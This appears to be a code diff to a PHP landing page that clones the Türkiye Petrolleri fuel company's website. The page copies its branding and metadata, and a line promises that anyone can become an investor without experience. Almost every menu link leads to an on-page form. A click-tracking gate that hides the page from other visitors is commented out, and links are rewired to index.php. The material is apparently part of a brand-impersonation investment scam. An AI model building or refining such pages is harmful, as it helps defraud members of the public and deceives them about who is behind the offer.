@@ -1,7 +1,7 @@
 <?php
-if (!isset($rawClick) && !isset($click)) {
-  die();
-}
+// if (!isset($rawClick) && !isset($click)) {
+//   die();
+// }
 ?>
 <?php
 
@@ -34,15 +34,15 @@ include_once dirname(__FILE__) . '/config.php';
     <meta property="og:description" content="Türkiye’nin en köklü markalarından biri olarak sağlığa, emniyete ve çevreye duyarlı olan, değerlerinden güç alarak kaliteli ürün ve hizmet sunan, yaratıcı çözümleri ve olumlu yaklaşımlarıyla, sürekli gelişerek büyüyen Türkiye Petrolleri, müşterilerine değer sağlama prensibiyle sektöre yön vermeyi hedefliyor." />
     <meta property="og:type" content="article" />
     <meta property="og:image" content="Content/piclib/vinyet.jpg" />
-    <meta property="og:url" content="index.html" />
+    <meta property="og:url" content="index.php" />
     <meta name="twitter:card" content="summary_large_image" />
     <meta name="twitter:title" content="Türkiye Petrolleri" />
     <meta name="twitter:description" content="Türkiye’nin en köklü markalarından biri olarak sağlığa, emniyete ve çevreye duyarlı olan, değerlerinden güç alarak kaliteli ürün ve hizmet sunan, yaratıcı çözümleri ve olumlu yaklaşımlarıyla, sürekli gelişerek büyüyen Türkiye Petrolleri, müşterilerine değer sağlama prensibiyle sektöre yön vermeyi hedefliyor." />
     <meta name="twitter:image" content="Content/piclib/vinyet.jpg" />
-    <meta name="twitter:url" content="index.html">
-        <link rel="canonical" href="index.html">
-    <link rel="alternate" href="index.html" hreflang="x-default" />
-    <link rel="alternate" href="index.html" hreflang="tr" />
+    <meta name="twitter:url" content="index.php">
+        <link rel="canonical" href="index.php">
+    <link rel="alternate" href="index.php" hreflang="x-default" />
+    <link rel="alternate" href="index.php" hreflang="tr" />
         <link rel="alternate" href="en" hreflang="en" />
     <link rel="image_src" href="Content/piclib/vinyet.jpg" />
     <link rel="preload" as="font" href="assets/fonts/fontawesome-webfont3e6e.woff2?v=4.7.0" type="font/woff2" crossorigin="anonymous">
@@ -75,7 +75,7 @@ include_once dirname(__FILE__) . '/config.php';
     <script>
         var dilStr = "tr";
         var urlLngPrefix = "";
-        var mainPageUrl = "index.html";
+        var mainPageUrl = "index.php";
         var pagelogo = "logo.png";
         var seciniz_title = "Seçiniz";
 		var search_url = "arama";
@@ -262,7 +262,7 @@ include_once dirname(__FILE__) . '/config.php';
                     </div>
                     <div id="mainmenu">
                         <div class="logo d-none d-md-block">
-                            <a href="index.html" title="Türkiye Petrolleri">
+                            <a href="index.php" title="Türkiye Petrolleri">
                                 <svg class="icon">
                                     <use xlink:href="assets/img/sprite5032.svg?v=202411261926#logo"></use>
                                 </svg>
@@ -270,11 +270,11 @@ include_once dirname(__FILE__) . '/config.php';
                         </div>
                         <nav id="main-navigation" class="navigation mm-theme-dark">
                             <ul class="mainnav1">
-                                <li class="main d-block d-md-none"><a href="index.html">ANA SAYFA</a></li>
+                                <li class="main d-block d-md-none"><a href="index.php">ANA SAYFA</a></li>
                                 <li class='main hassub'><a href='#form-wrapper'>KURUMSAL</a><div class="sub sub2"><div class="row"><div class='col-md-4'><ol><li class=""><a href="#form-wrapper">Hakkımızda</a></li><li class=""><a href="#form-wrapper">Yönetim Kurulu</a></li><li class=""><a href="#form-wrapper">Vizyon & Misyon</a></li><li class=""><a href="#form-wrapper">SEÇ Politikaları</a></li></ol></div><div class='col-md-4'><ol><li class=""><a href="#form-wrapper">İnsan Kaynakları Politikaları</a></li><li class=""><a href="#form-wrapperi">Kariyer İmkanları</a></li><li class=""><a href="#form-wrapper">Uygulama ve Süreçler</a></li></ol></div><div class='col-md-4'><ol><li class=""><a href="#form-wrapper">Müşteri Hizmetleri Politikamız</a></li><li class=""><a href="#form-wrapper" rel="nofollow">Zülfikarlar Holding</a></li></ol></div></div></div></li><li class="main "><a href="#form-wrapper">İSTASYONLAR</a></li><li class='main hassub hassub2 '><a href='#form-wrapper'>AKARYAKIT FİYATLARI</a><div class="sub sub2"><ol><li class=""><a href="#form-wrapper">Güncel Akaryakıt Fiyatları</a></li><li class=""><a href="#form-wrapper">Geçmiş Dönem Akaryakıt Fiyatları</a></li><li class=""><a href="#form-wrapper">Akaryakıt Fiyatları Politikası</a></li></ol></div></li><li class='main hassub'><a href='#form-wrapper'>ÜRÜNLER</a><div class="sub sub2"><div class="row"><div class='col-md-4'><ol><li class=""><a href="#form-wrapper">Kurşunsuz Benzin 95 Oktan</a></li><li class=""><a href="#form-wrapper">LPG - Otogaz</a></li></ol></div><div class='col-md-4'><ol><li class=""><a href="#form-wrapper">Motorin</a></li><li class=""><a href="#form-wrapper">Motorin TP Ekstra Diesel</a></li></ol></div><div class='col-md-4'><ol><li class=""><a href="#form-wrapper">Endüstriyel Yakıtlar</a></li><li class=""><a href="#form-wrapper">Madeni Yağlar</a></li><li class=""><a href="#form-wrapper">Ticari Yakıtlar</a></li></ol></div></div></div></li><li class='main hassub hassub2 '><a href='#form-wrapper'>HİZMETLER</a><div class="sub sub2"><ol><li class=""><a href="#form-wrapper" rel="nofollow">Taşıt Tanıma - Filotech</a></li></ol></div></li><li class='main hassub hassub2 hassubright'><a href='#form-wrapper'>İLETİŞİM</a><div class="sub sub2"><ol><li class=""><a href="#form-wrapper">Genel Müdürlük</a></li><li class=""><a href="#form-wrapper">Terminaller</a></li><li class=""><a href="#form-wrapper">Öneri ve Şikayetler</a></li><li class=""><a href="#form-wrapper">Bayilik Başvurusu</a></li></ol></div></li>
                             </ul>
                             <div class="search">
-                                <form method="post" action="../external.html?link=https://www.tppd.com.tr/arama" name="frmSearchTop" id="frmSearchTop">
+                                <form method="post" action="" name="frmSearchTop" id="frmSearchTop">
                                     <input type="text" id="txtSearchTop" name="txtSearch" placeholder="Ne aramıştınız?" class="form-control">
                                     <button type="submit" aria-label="Ne aramıştınız?">
                                         <svg class="icon">
@@ -348,7 +348,7 @@ Hiç bir tecrübe gerekmeden herkes Yatırımcı olabilir. Teknik ekipler aracı
                     <div class="container">
                         <div class="row no-gutters">
                             <div class="col-md-3 coll">
-                                <a href="index.html" class="logo" title="Türkiye Petrolleri">
+                                <a href="index.php" class="logo" title="Türkiye Petrolleri">
                                     <svg class="icon">
                                         <use xlink:href="assets/img/sprite5032.svg?v=202411261926#logo"></use>
                                     </svg>
@@ -383,7 +383,7 @@ Hiç bir tecrübe gerekmeden herkes Yatırımcı olabilir. Teknik ekipler aracı
                     <div class="container">
                         <div class="row no-gutters">
                             <div class="col-md-8 col-lg-9">
-                                <form method="post" action="../external.html?link=https://www.tppd.com.tr/arama" name="frmSearchFooter" id="frmSearchFooter">
+                                <form method="post" action="" name="frmSearchFooter" id="frmSearchFooter">
                                     <input type="text" id="txtSearchFooter" name="txtSearch" placeholder="Ne aramıştınız?" class="form-control">
                                     <button type="submit" aria-label="Ne aramıştınız?">
                                         <svg class="icon">
